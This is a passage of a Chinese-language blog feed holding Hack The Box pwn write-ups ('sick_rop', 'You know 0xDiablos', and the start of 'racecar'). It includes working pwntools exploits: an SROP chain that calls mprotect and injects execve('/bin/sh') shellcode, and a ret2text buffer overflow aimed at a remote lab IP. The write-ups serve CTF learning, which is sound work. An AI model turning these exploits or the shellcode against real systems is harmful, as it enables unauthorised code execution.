class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000401012 : and al, 0x10 ; syscall</span><br><span class=\"line\">0x000000000040100d : and al, 8 ; mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x0000000000401044 : call qword ptr [rax + 0x41]</span><br><span class=\"line\">0x000000000040104c : dec ecx ; ret</span><br><span class=\"line\">0x000000000040100c : je 0x401032 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401023 : je 0x401049 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401054 : jmp 0x40104f</span><br><span class=\"line\">0x000000000040104d : leave ; ret</span><br><span class=\"line\">0x0000000000401010 : mov edx, dword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100b : mov esi, dword ptr [rsp + 8] ; mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100f : mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100e : or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401011 : push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401016 : ret</span><br><span class=\"line\">0x0000000000401049 : retf 0xffff</span><br><span class=\"line\">0x0000000000401014 : syscall</span><br></pre></td></tr></table></figure></p>\n<p>然后拖入 ida 发现就 4 个功能，第一次碰到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __fastcall __noreturn start(int a1, int a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  while ( 1 )</span><br><span class=\"line\">    vuln(a1, a2, a3, a4, a5, a6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>启动写了一个死循环一直调用 vuln</p>\n<p>而 vuln 模块的话</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall vuln(int a1, int a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  size_t v6; // rax</span><br><span class=\"line\">  int v7; // edx</span><br><span class=\"line\">  int v8; // ecx</span><br><span class=\"line\">  int v9; // er8</span><br><span class=\"line\">  int v10; // er9</span><br><span class=\"line\">  const char *v11; // r10</span><br><span class=\"line\">  char v13[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = read(a1, a2, a3, a4, a5, a6, v13, 0x300uLL);</span><br><span class=\"line\">  return write(a1, a2, v7, v8, v9, v10, v11, v6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>调用了 read 和 write 函数，</p>\n<p>这个时候构造成 srop</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(&#x27;./sick_rop&#x27;)</span><br><span class=\"line\">if args.R:</span><br><span class=\"line\"> p = remote(&quot;*.*.*.*&quot;,30479)</span><br><span class=\"line\">else:</span><br><span class=\"line\"> p = elf.process()</span><br><span class=\"line\">context.clear(arch=&#x27;amd64&#x27;)</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">syscall_ret = 0x401014</span><br><span class=\"line\">read = 0x401000</span><br><span class=\"line\">writable = 0x400000</span><br><span class=\"line\">new_ret = 0x400018</span><br><span class=\"line\">vuln = elf.sym.vuln</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;A&#x27;*40    # to our offset</span><br><span class=\"line\">payload += p64(vuln)</span><br><span class=\"line\">payload += p64(syscall_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame(kernel=&quot;amd64&quot;)</span><br><span class=\"line\">frame.rax = 0xa     # syscall for mprotect()</span><br><span class=\"line\">frame.rdi = writable</span><br><span class=\"line\">frame.rsi = 0x4000</span><br><span class=\"line\">frame.rdx = 0x7    # rwx (read ,write , execute)</span><br><span class=\"line\">frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400...</span><br><span class=\"line\">frame.rip = syscall_ret</span><br><span class=\"line\"></span><br><span class=\"line\">payload += bytes(frame) # fake sigreturnframe</span><br><span class=\"line\"></span><br><span class=\"line\"># sending</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;B&#x27;* (0xf - 1 ) # sigret 15 syscall</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\"># shellcode</span><br><span class=\"line\">shell_code = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;</span><br><span class=\"line\">payload = shell_code.ljust(40, b&#x27;A&#x27;)</span><br><span class=\"line\">payload += p64(0x4010b8)</span><br><span class=\"line\">log.info(&#x27;[*] Sending second stage payload with &#123;&#125; bytes ...&#x27;.format(len(payload)))</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-You-know-0xDiablos-md/",
            "url": "https://lookhui.github.io/HTB-You-know-0xDiablos-md/",
            "title": "HTB-You_know_0xDiablos",
            "date_published": "2023-12-13T10:51:43.000Z",
            "content_html": "<h1 id=\"you-know-0xdiablos\"><a class=\"anchor\" href=\"#you-know-0xdiablos\">#</a> You know 0xDiablos</h1>\n<p>这个题真的很简单一个 ret2text</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Partial RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      No PIE (0x8048000)</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>\n<p>又是一个 32 位的程序使用 strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tdX</span><br><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">exit</span><br><span class=\"line\">fopen</span><br><span class=\"line\">puts</span><br><span class=\"line\">printf</span><br><span class=\"line\">fgets</span><br><span class=\"line\">stdout</span><br><span class=\"line\">setresgid</span><br><span class=\"line\">getegid</span><br><span class=\"line\">setvbuf</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">GLIBC_2.1</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">Hurry up and try in on server side.</span><br><span class=\"line\">You know who are 0xDiablos:</span><br><span class=\"line\">;*2$&quot;</span><br><span class=\"line\">GCC: (Debian 8.3.0-19) 8.3.0</span><br><span class=\"line\">crtstuff.c</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">completed.6887</span><br><span class=\"line\">__do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__frame_dummy_init_array_entry</span><br><span class=\"line\">vuln.c</span><br><span class=\"line\">__FRAME_END__</span><br><span class=\"line\">__init_array_end</span><br><span class=\"line\">_DYNAMIC</span><br><span class=\"line\">__init_array_start</span><br><span class=\"line\">__GNU_EH_FRAME_HDR</span><br><span class=\"line\">_GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">__x86.get_pc_thunk.bx</span><br><span class=\"line\">printf@@GLIBC_2.0</span><br><span class=\"line\">__x86.get_pc_thunk.bp</span><br><span class=\"line\">vuln</span><br><span class=\"line\">fgets@@GLIBC_2.0</span><br><span class=\"line\">_edata</span><br><span class=\"line\">getegid@@GLIBC_2.0</span><br><span class=\"line\">__data_start</span><br><span class=\"line\">puts@@GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">exit@@GLIBC_2.0</span><br><span class=\"line\">__dso_handle</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">__libc_start_main@@GLIBC_2.0</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">setvbuf@@GLIBC_2.0</span><br><span class=\"line\">fopen@@GLIBC_2.1</span><br><span class=\"line\">_dl_relocate_static_pie</span><br><span class=\"line\">_fp_hw</span><br><span class=\"line\">stdout@@GLIBC_2.0</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">main</span><br><span class=\"line\">__TMC_END__</span><br><span class=\"line\">setresgid@@GLIBC_2.0</span><br><span class=\"line\">flag</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.got</span><br><span class=\"line\">.got.plt</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>查看到里面有一个我们需要的 flag</p>\n<p>直接拖入 ida32 查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __gid_t v4; // [esp+0h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(stdout, 0, 2, 0);</span><br><span class=\"line\">  v4 = getegid();</span><br><span class=\"line\">  setresgid(v4, v4, v4);</span><br><span class=\"line\">  puts(&quot;You know who are 0xDiablos: &quot;);</span><br><span class=\"line\">  vuln();</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>调用了 vuln 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int vuln()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s[180]; // [esp+0h] [ebp-B8h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  return puts(s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里有一个危险函数 gets，s 分配了 180 的内存空间</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char *__cdecl flag(int a1, int a2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char *result; // eax</span><br><span class=\"line\">  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF</span><br><span class=\"line\">  FILE *stream; // [esp+4Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class=\"line\">  if ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(&quot;Hurry up and try in on server side.&quot;);</span><br><span class=\"line\">    exit(0);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = fgets(s, 64, stream);</span><br><span class=\"line\">  if ( a1 == -559038737 &amp;&amp; a2 == -1059139571 )</span><br><span class=\"line\">    return (char *)printf(s);</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个 flag 函数使用了 fopen 读取了内容储存到了 stream 上，我们现在只需要让</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a1 == -559038737以及 a2 == -1059139571</span><br></pre></td></tr></table></figure></p>\n<p>就能得到 flag</p>\n<p>查看汇编码得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08049243 ; 13:   if ( a1 == -559038737 &amp;&amp; a2 == -1059139571 )</span><br><span class=\"line\">.text:08049243                 add     esp, 10h</span><br><span class=\"line\">.text:08049246                 cmp     [ebp+arg_0], 0DEADBEEFh</span><br><span class=\"line\">.text:0804924D                 jnz     short loc_8049269</span><br><span class=\"line\">.text:0804924F                 cmp     [ebp+arg_4], 0C0DED00Dh</span><br><span class=\"line\">.text:08049256                 jnz     short loc_804926C</span><br></pre></td></tr></table></figure></p>\n<p>也就是比较 0xDEADBEEF 和 0xC0DED00D 那直接构造 exp</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*188+p32(0x80491E2)+p32(0)+p32(0xDEADBEEF)+p32(0xC0DED00D)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;188.166.175.58&quot;,32705)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;Diablos:&quot;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-racecar-md/",
            "url": "https://lookhui.github.io/HTB-racecar-md/",
            "title": "HTB-racecar",
            "date_published": "2023-12-13T07:34:15.000Z",
            "content_html": "<h1 id=\"htb-racecar\"><a class=\"anchor\" href=\"#htb-racecar\">#</a> HTB-racecar</h1>\n<p>查看保护</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    Canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>\n<p>保护全开</p>\n<p>使用 strings 查看一下字段</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">exit</span><br><span class=\"line\">srand</span><br><span class=\"line\">fopen</span><br><span class=\"line\">puts</span><br><span class=\"line\">time</span><br><span class=\"line\">putchar</span><br><span class=\"line\">stdin</span><br><span class=\"line\">printf</span><br><span class=\"line\">fgets</span><br><span class=\"line\">strlen</span><br><span class=\"line\">read</span><br><span class=\"line\">stdout</span><br><span class=\"line\">malloc</span><br><span class=\"line\">alarm</span><br><span class=\"line\">atoi</span><br><span class=\"line\">sleep</span><br><span class=\"line\">__cxa_finalize</span><br><span class=\"line\">setvbuf</span><br><span class=\"line\">strcmp</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">__stack_chk_fail</span><br><span class=\"line\">GLIBC_2.1</span><br><span class=\"line\">GLIBC_2.1.3</span><br><span class=\"line\">GLIBC_2.4</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">UWVS</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">[1;33m</span><br><span class=\"line\">[1;36m</span><br><span class=\"line\">[1;32m</span><br><span class=\"line\">[1;31m</span><br><span class=\"line\">[1;34m</span><br><span class=\"line\">[1;35m</span><br><span class=\"line\">%s      ______                                       %s|xxx|</span><br><span class=\"line\">%s     /|_||_\\`.__                                   %s| F |</span><br><span class=\"line\">%s    (   _    _ _\\                                  %s|xxx|</span><br><span class=\"line\">%s*** =`-(_)--(_)-&#x27;                                  %s| I |</span><br><span class=\"line\">                                                   %s|xxx|</span><br><span class=\"line\">                                                   %s| N |</span><br><span class=\"line\">                                                   %s| I |</span><br><span class=\"line\">%s             _-_-  _/\\______\\__                    %s| S |</span><br><span class=\"line\">%s           _-_-__ / ,-. -|-  ,-.`-.                %s|xxx|</span><br><span class=\"line\">%s            _-_- `( o )----( o )-&#x27;                 %s| H |</span><br><span class=\"line\">%s                   `-&#x27;      `-&#x27;                    %s|xxx|</span><br><span class=\"line\">Select race:</span><br><span class=\"line\">1. Highway battle</span><br><span class=\"line\">2. Circuit</span><br><span class=\"line\">%s[-] Invalid choice!%s</span><br><span class=\"line\">Select car:</span><br><span class=\"line\">[*] Waiting for the race to finish...</span><br><span class=\"line\">[+] You won the race!! You get 100 coins!</span><br><span class=\"line\">[+] Current coins: [%d]%s</span><br><span class=\"line\">[!] Do you have anything to say to the press after your big victory?</span><br><span class=\"line\">&gt; %s</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">%s[-] Could not open flag.txt. Please contact the creator.</span><br><span class=\"line\">[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:</span><br><span class=\"line\">[-] You lost the race and all your coins!</span><br><span class=\"line\">%sInsert your data:</span><br><span 